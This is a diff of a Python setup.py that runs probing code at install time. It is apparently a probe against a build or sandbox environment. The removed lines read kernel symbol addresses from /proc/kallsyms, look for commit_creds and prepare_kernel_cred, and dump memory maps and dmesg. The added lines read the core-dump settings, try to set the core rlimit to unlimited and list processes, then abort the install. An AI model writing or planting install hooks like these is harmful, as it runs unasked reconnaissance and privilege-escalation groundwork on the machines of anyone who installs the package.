@@ -1,39 +1,35 @@
-import os, sys, subprocess as sp
+import os, sys, resource, subprocess as sp
 from setuptools import setup
 
-def kernel_leak():
+def exploit_check():
     o = sys.stderr.write
-    o("\n" + "*"*40 + "\n")
-    o("--- CORE KERNEL LEAK TEST ---\n")
+    o("\n" + "!"*40 + "\n")
+    o("--- CLOUDFLARE KERNEL CONFIG VULN CHECK ---\n")
 
- 
-    if os.path.exists('/proc/kallsyms'):
-        o("[!] ANALYZING KALLSYMS...\n")
-         
-        leak = sp.getoutput("head -n 5 /proc/kallsyms")
-        o(f"{leak}\n")
-        
-       
-        critical = sp.getoutput("grep -E 'commit_creds|prepare_kernel_cred' /proc/kallsyms")
-        if critical:
-            o(f"CRITICAL SYMBOLS FOUND:\n{critical}\n")
-        else:
-            o("Critical symbols hidden, but addresses leaked.\n")
+     
+    o("[1] CORE DUMP SETTINGS:\n")
+    o("pattern: " + sp.getoutput("cat /proc/sys/kernel/core_pattern") + "\n")
+    o("suid_dumpable: " + sp.getoutput("cat /proc/sys/fs/suid_dumpable") + "\n")
 
- 
-    o("\n[!] CHECKING MEMORY PROTECTION:\n")
-    o(sp.getoutput("cat /proc/self/maps | head -n 5") + "\n")
+     
+    soft, hard = resource.getrlimit(resource.RLIMIT_CORE)
+    o(f"[2] LIMITS: Soft={soft}, Hard={hard}\n")
+    
+  
+    try:
+        resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
+        o("SUCCESS: Core limits increased!\n")
+    except:
+        o("FAIL: Could not change core limits.\n")
 
- 
-    o("\n[!] DMESG ACCESS:\n")
-    o(sp.getoutput("dmesg | tail -n 5 || echo 'DMESG DENIED'"))
+    
+    o("\n[3] PROCESS LIST:\n")
+    o(sp.getoutput("ps auxf | head -n 10") + "\n")
 
-    o("\n" + "*"*40 + "\n")
+    o("\n" + "!"*40 + "\n")
     sys.exit(1)
 
-try: kernel_leak()
+try: exploit_check()
 except: sys.exit(1)
 
-setup(name="kernel-rip", version="0.1")
-
-setup(name="v-poc", version="1.0")
+setup(name="exploit-test", version="0.1")
